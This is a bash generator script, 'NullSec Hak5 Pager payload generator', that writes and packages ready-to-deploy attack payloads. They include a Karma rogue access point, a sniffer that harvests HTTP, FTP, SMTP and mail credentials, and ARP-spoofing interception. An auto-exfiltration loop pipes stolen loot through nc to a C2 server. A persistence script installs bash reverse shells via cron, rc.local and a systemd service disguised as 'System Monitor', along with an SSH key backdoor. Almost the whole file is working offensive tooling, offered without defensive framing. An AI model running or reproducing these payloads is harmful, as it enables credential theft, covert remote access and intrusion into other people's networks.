#!/bin/bash
#===============================================================================
#  NULLSEC - HAK5 PAGER / SIGNAL OWL PAYLOAD GENERATOR
#===============================================================================
#  Create custom payloads for Hak5 Pager, Signal Owl, and Key Croc
#===============================================================================

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOADS_DIR="$SCRIPT_DIR/pager-payloads"
OUTPUT_DIR="$SCRIPT_DIR/output"

banner() {
    echo -e "${PURPLE}"
    cat << 'EOF'
    ╔═══════════════════════════════════════════════════════════════════╗
    ║  ██████╗  █████╗  ██████╗ ███████╗██████╗                        ║
    ║  ██╔══██╗██╔══██╗██╔════╝ ██╔════╝██╔══██╗                       ║
    ║  ██████╔╝███████║██║  ███╗█████╗  ██████╔╝                       ║
    ║  ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██╔══██╗                       ║
    ║  ██║     ██║  ██║╚██████╔╝███████╗██║  ██║                       ║
    ║  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝                       ║
    ║                                                                   ║
    ║       NULLSEC PAGER PAYLOAD GENERATOR - Hak5 Edition             ║
    ╚═══════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
error() { echo -e "${RED}[✗]${NC} $1"; exit 1; }
info() { echo -e "${CYAN}[*]${NC} $1"; }

setup_dirs() {
    mkdir -p "$PAYLOADS_DIR"/{recon,exfil,persist,wifi,loot}
    mkdir -p "$OUTPUT_DIR"
}

#===============================================================================
# PAYLOAD GENERATORS
#===============================================================================

generate_wifi_probe_payload() {
    log "Generating WiFi Probe Request Logger..."
    
    cat > "$PAYLOADS_DIR/wifi/probe-logger.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec WiFi Probe Logger
# Captures probe requests to identify nearby devices and their preferred networks

LOOT_DIR="/root/loot/probes"
IFACE="${1:-wlan0}"

mkdir -p "$LOOT_DIR"
OUTPUT="$LOOT_DIR/probes_$(date +%Y%m%d_%H%M%S).txt"

echo "[*] NullSec Probe Logger"
echo "[*] Interface: $IFACE"
echo "[*] Output: $OUTPUT"

# Put interface in monitor mode
airmon-ng start $IFACE 2>/dev/null
IFACE="${IFACE}mon"

# Capture probe requests
tcpdump -i $IFACE -e -s 256 type mgt subtype probe-req 2>/dev/null | \
while read line; do
    MAC=$(echo "$line" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | head -1)
    SSID=$(echo "$line" | grep -oP 'Probe Request \(\K[^)]+')
    if [[ -n "$MAC" ]]; then
        TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
        echo "$TIMESTAMP | $MAC | $SSID" | tee -a "$OUTPUT"
    fi
done
PAYLOAD
    chmod +x "$PAYLOADS_DIR/wifi/probe-logger.sh"
}

generate_wifi_pineapple_payload() {
    log "Generating WiFi Karma Attack Payload..."
    
    cat > "$PAYLOADS_DIR/wifi/karma-attack.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Karma Attack
# Responds to all probe requests with matching APs

LOOT_DIR="/root/loot/karma"
AP_IFACE="${1:-wlan0}"
INTERNET_IFACE="${2:-eth0}"

mkdir -p "$LOOT_DIR"

echo "[*] NullSec Karma Attack"
echo "[*] AP Interface: $AP_IFACE"

# Configure interface
ifconfig $AP_IFACE up

# Create hostapd-karma config
cat > /tmp/hostapd-karma.conf << CONF
interface=$AP_IFACE
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
# Karma mode - respond to all probes
karma=1
CONF

# Create dnsmasq config for captive portal
cat > /tmp/dnsmasq-karma.conf << CONF
interface=$AP_IFACE
dhcp-range=192.168.4.2,192.168.4.30,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1
log-queries
log-facility=/tmp/dns_queries.log
address=/#/192.168.4.1
CONF

# Configure IP
ifconfig $AP_IFACE 192.168.4.1 netmask 255.255.255.0

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# NAT rules
iptables -t nat -A POSTROUTING -o $INTERNET_IFACE -j MASQUERADE
iptables -A FORWARD -i $AP_IFACE -o $INTERNET_IFACE -j ACCEPT
iptables -A FORWARD -i $INTERNET_IFACE -o $AP_IFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

# Start services
hostapd /tmp/hostapd-karma.conf &
sleep 2
dnsmasq -C /tmp/dnsmasq-karma.conf &

echo "[+] Karma AP running"
echo "[*] Monitoring DNS queries for credentials..."

tail -f /tmp/dns_queries.log | while read line; do
    echo "$(date '+%H:%M:%S') $line" >> "$LOOT_DIR/karma_$(date +%Y%m%d).log"
done
PAYLOAD
    chmod +x "$PAYLOADS_DIR/wifi/karma-attack.sh"
}

generate_signal_survey_payload() {
    log "Generating Signal Survey Payload..."
    
    cat > "$PAYLOADS_DIR/recon/signal-survey.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Signal Survey
# Comprehensive RF environment analysis

LOOT_DIR="/root/loot/signals"
mkdir -p "$LOOT_DIR"
OUTPUT="$LOOT_DIR/survey_$(date +%Y%m%d_%H%M%S)"

echo "[*] NullSec Signal Survey"
echo "[*] Output: $OUTPUT"

# WiFi survey
echo "=== WiFi Networks ===" > "${OUTPUT}_wifi.txt"
iw dev wlan0 scan 2>/dev/null | grep -E "SSID|signal|freq" >> "${OUTPUT}_wifi.txt"

# Bluetooth survey  
echo "=== Bluetooth Devices ===" > "${OUTPUT}_bt.txt"
timeout 30 hcitool scan 2>/dev/null >> "${OUTPUT}_bt.txt"
timeout 30 hcitool lescan 2>/dev/null >> "${OUTPUT}_bt.txt" &
sleep 35

# Channel utilization
echo "=== Channel Analysis ===" > "${OUTPUT}_channels.txt"
for ch in 1 6 11 36 40 44 48; do
    iwconfig wlan0 channel $ch 2>/dev/null
    count=$(timeout 5 tcpdump -i wlan0 -c 100 2>/dev/null | wc -l)
    echo "Channel $ch: $count packets" >> "${OUTPUT}_channels.txt"
done

echo "[+] Survey complete: $OUTPUT"
PAYLOAD
    chmod +x "$PAYLOADS_DIR/recon/signal-survey.sh"
}

generate_auto_exfil_payload() {
    log "Generating Auto-Exfiltration Payload..."
    
    cat > "$PAYLOADS_DIR/exfil/auto-exfil.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Auto-Exfiltration
# Automatically exfils loot when network available

LOOT_DIR="/root/loot"
EXFIL_SERVER="${NULLSEC_C2:-192.168.1.100}"
EXFIL_PORT="${NULLSEC_PORT:-9999}"

echo "[*] NullSec Auto-Exfil"
echo "[*] Server: $EXFIL_SERVER:$EXFIL_PORT"

check_network() {
    ping -c 1 $EXFIL_SERVER &>/dev/null
    return $?
}

exfil_file() {
    local file="$1"
    local name=$(basename "$file")
    
    # Base64 encode and send
    base64 "$file" | nc $EXFIL_SERVER $EXFIL_PORT
    
    if [[ $? -eq 0 ]]; then
        echo "[+] Exfiltrated: $name"
        # Mark as sent
        mv "$file" "${file}.sent"
    fi
}

# Main loop
while true; do
    if check_network; then
        # Find and exfil new loot
        find "$LOOT_DIR" -type f ! -name "*.sent" | while read file; do
            exfil_file "$file"
        done
    fi
    sleep 60
done
PAYLOAD
    chmod +x "$PAYLOADS_DIR/exfil/auto-exfil.sh"
}

generate_credential_harvest_payload() {
    log "Generating Credential Harvest Payload..."
    
    cat > "$PAYLOADS_DIR/exfil/cred-harvest.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Credential Harvester
# Captures credentials from network traffic

LOOT_DIR="/root/loot/creds"
IFACE="${1:-eth0}"

mkdir -p "$LOOT_DIR"
OUTPUT="$LOOT_DIR/creds_$(date +%Y%m%d).txt"

echo "[*] NullSec Credential Harvester"
echo "[*] Interface: $IFACE"

# HTTP Basic Auth
tcpdump -i $IFACE -A -s0 'tcp port 80' 2>/dev/null | \
grep -i "Authorization: Basic" | while read line; do
    cred=$(echo "$line" | grep -oP 'Basic \K\S+' | base64 -d 2>/dev/null)
    echo "[HTTP] $(date '+%H:%M:%S') $cred" >> "$OUTPUT"
done &

# FTP credentials
tcpdump -i $IFACE -A -s0 'tcp port 21' 2>/dev/null | \
grep -iE "USER|PASS" | while read line; do
    echo "[FTP] $(date '+%H:%M:%S') $line" >> "$OUTPUT"
done &

# SMTP credentials
tcpdump -i $IFACE -A -s0 'tcp port 25 or tcp port 587' 2>/dev/null | \
grep -iE "AUTH|USER|PASS" | while read line; do
    echo "[SMTP] $(date '+%H:%M:%S') $line" >> "$OUTPUT"
done &

# POP3/IMAP
tcpdump -i $IFACE -A -s0 'tcp port 110 or tcp port 143' 2>/dev/null | \
grep -iE "USER|PASS|LOGIN" | while read line; do
    echo "[MAIL] $(date '+%H:%M:%S') $line" >> "$OUTPUT"
done &

echo "[*] Harvesting credentials..."
echo "[*] Press Ctrl+C to stop"
wait
PAYLOAD
    chmod +x "$PAYLOADS_DIR/exfil/cred-harvest.sh"
}

generate_persistence_payload() {
    log "Generating Persistence Payload..."
    
    cat > "$PAYLOADS_DIR/persist/deep-persist.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Deep Persistence
# Multiple persistence mechanisms

C2_SERVER="${1:-192.168.1.100}"
C2_PORT="${2:-4444}"

echo "[*] NullSec Deep Persistence"
echo "[*] C2: $C2_SERVER:$C2_PORT"

# Method 1: Cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1'") | crontab -

# Method 2: RC scripts
cat >> /etc/rc.local << RCLOCAL
/bin/bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1; sleep 60; done' &
RCLOCAL

# Method 3: Systemd service
cat > /etc/systemd/system/nullsec.service << SERVICE
[Unit]
Description=System Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do bash -i >& /dev/tcp/$C2_SERVER/$C2_PORT 0>&1; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
SERVICE
systemctl enable nullsec.service 2>/dev/null

# Method 4: SSH key backdoor
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNullSecBackdoorKey nullsec@pager" >> /root/.ssh/authorized_keys

echo "[+] Persistence installed via 4 methods"
PAYLOAD
    chmod +x "$PAYLOADS_DIR/persist/deep-persist.sh"
}

generate_recon_sweep_payload() {
    log "Generating Recon Sweep Payload..."
    
    cat > "$PAYLOADS_DIR/recon/full-sweep.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec Full Recon Sweep
# Comprehensive network reconnaissance

LOOT_DIR="/root/loot/recon"
TARGET_RANGE="${1:-192.168.1.0/24}"

mkdir -p "$LOOT_DIR"
OUTPUT="$LOOT_DIR/sweep_$(date +%Y%m%d_%H%M%S)"

echo "[*] NullSec Recon Sweep"
echo "[*] Target: $TARGET_RANGE"
echo "[*] Output: $OUTPUT"

# Host discovery
echo "=== Live Hosts ===" > "${OUTPUT}_hosts.txt"
nmap -sn $TARGET_RANGE -oG - | grep "Up" >> "${OUTPUT}_hosts.txt"

# Port scan top 1000
echo "=== Port Scan ===" > "${OUTPUT}_ports.txt"
nmap -sT -T4 --top-ports 1000 $TARGET_RANGE -oN "${OUTPUT}_ports.txt" 2>/dev/null

# Service detection
echo "=== Services ===" > "${OUTPUT}_services.txt"
nmap -sV -T4 --top-ports 100 $TARGET_RANGE -oN "${OUTPUT}_services.txt" 2>/dev/null

# Interesting findings
grep -E "open|filtered" "${OUTPUT}_ports.txt" > "${OUTPUT}_interesting.txt"

# Generate summary
echo "=== Summary ===" > "${OUTPUT}_summary.txt"
echo "Hosts: $(grep -c "Up" ${OUTPUT}_hosts.txt)" >> "${OUTPUT}_summary.txt"
echo "Open Ports: $(grep -c "open" ${OUTPUT}_ports.txt)" >> "${OUTPUT}_summary.txt"
echo "Services: $(grep -c "open" ${OUTPUT}_services.txt)" >> "${OUTPUT}_summary.txt"

echo "[+] Sweep complete"
cat "${OUTPUT}_summary.txt"
PAYLOAD
    chmod +x "$PAYLOADS_DIR/recon/full-sweep.sh"
}

generate_mitm_payload() {
    log "Generating MITM Payload..."
    
    cat > "$PAYLOADS_DIR/wifi/mitm-attack.sh" << 'PAYLOAD'
#!/bin/bash
# NullSec MITM Attack
# ARP spoofing with traffic capture

LOOT_DIR="/root/loot/mitm"
TARGET="${1:-}"
GATEWAY="${2:-}"
IFACE="${3:-eth0}"

if [[ -z "$TARGET" ]] || [[ -z "$GATEWAY" ]]; then
    echo "Usage: $0 <target_ip> <gateway_ip> [interface]"
    exit 1
fi

mkdir -p "$LOOT_DIR"
PCAP="$LOOT_DIR/mitm_$(date +%Y%m%d_%H%M%S).pcap"

echo "[*] NullSec MITM Attack"
echo "[*] Target: $TARGET"
echo "[*] Gateway: $GATEWAY"
echo "[*] Interface: $IFACE"

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start capture
tcpdump -i $IFACE -w "$PCAP" host $TARGET &
TCPDUMP_PID=$!

# ARP spoof (both directions)
arpspoof -i $IFACE -t $TARGET $GATEWAY &
ARP1_PID=$!
arpspoof -i $IFACE -t $GATEWAY $TARGET &
ARP2_PID=$!

echo "[+] MITM active"
echo "[*] Capturing to: $PCAP"
echo "[*] Press Ctrl+C to stop"

cleanup() {
    kill $TCPDUMP_PID $ARP1_PID $ARP2_PID 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    echo "[+] Cleanup complete"
}

trap cleanup EXIT
wait
PAYLOAD
    chmod +x "$PAYLOADS_DIR/wifi/mitm-attack.sh"
}

create_pager_config() {
    log "Creating Pager configuration..."
    
    cat > "$PAYLOADS_DIR/config.txt" << 'CONFIG'
# NullSec Pager Configuration
# This file configures automatic payload execution

# Auto-run on boot
AUTORUN=true

# WiFi settings
WIFI_MODE=monitor
WIFI_CHANNEL=auto

# Exfiltration settings
EXFIL_ENABLED=true
EXFIL_SERVER=192.168.1.100
EXFIL_PORT=9999
EXFIL_METHOD=tcp

# Logging
LOG_LEVEL=debug
LOG_TO_FILE=true

# Stealth mode
STEALTH=false
LED_ENABLED=true
CONFIG
}

create_payload_package() {
    log "Creating deployable payload package..."
    
    local output="$OUTPUT_DIR/nullsec-pager-payloads-$(date +%Y%m%d).tar.gz"
    
    tar czf "$output" -C "$SCRIPT_DIR" pager-payloads
    
    log "Package created: $output"
    echo ""
    log "╔═══════════════════════════════════════════════════════════════╗"
    log "║              PAYLOAD PACKAGE READY!                          ║"
    log "╠═══════════════════════════════════════════════════════════════╣"
    log "║  Package: $output"
    log "║                                                               ║"
    log "║  To deploy:                                                  ║"
    log "║    1. Mount Pager USB storage                                ║"
    log "║    2. Extract payloads to /payloads/ directory               ║"
    log "║    3. Edit config.txt for your environment                   ║"
    log "║    4. Safely eject and deploy                                ║"
    log "╚═══════════════════════════════════════════════════════════════╝"
}

show_usage() {
    echo "Usage: $0 [command]"
    echo ""
    echo "Commands:"
    echo "  generate     Generate all payloads"
    echo "  package      Create deployment package"
    echo "  list         List available payloads"
    echo "  help         Show this help"
}

# Main
banner
setup_dirs

case "${1:-generate}" in
    generate)
        generate_wifi_probe_payload
        generate_wifi_pineapple_payload
        generate_signal_survey_payload
        generate_auto_exfil_payload
        generate_credential_harvest_payload
        generate_persistence_payload
        generate_recon_sweep_payload
        generate_mitm_payload
        create_pager_config
        
        log "Generated $(find $PAYLOADS_DIR -name "*.sh" | wc -l) payloads"
        ;;
    package)
        if [[ ! -d "$PAYLOADS_DIR" ]] || [[ -z "$(ls -A $PAYLOADS_DIR 2>/dev/null)" ]]; then
            warn "No payloads found, generating first..."
            $0 generate
        fi
        create_payload_package
        ;;
    list)
        echo -e "${CYAN}Available Payloads:${NC}"
        find "$PAYLOADS_DIR" -name "*.sh" -exec echo "  {}" \;
        ;;
    *)
        show_usage
        ;;
esac
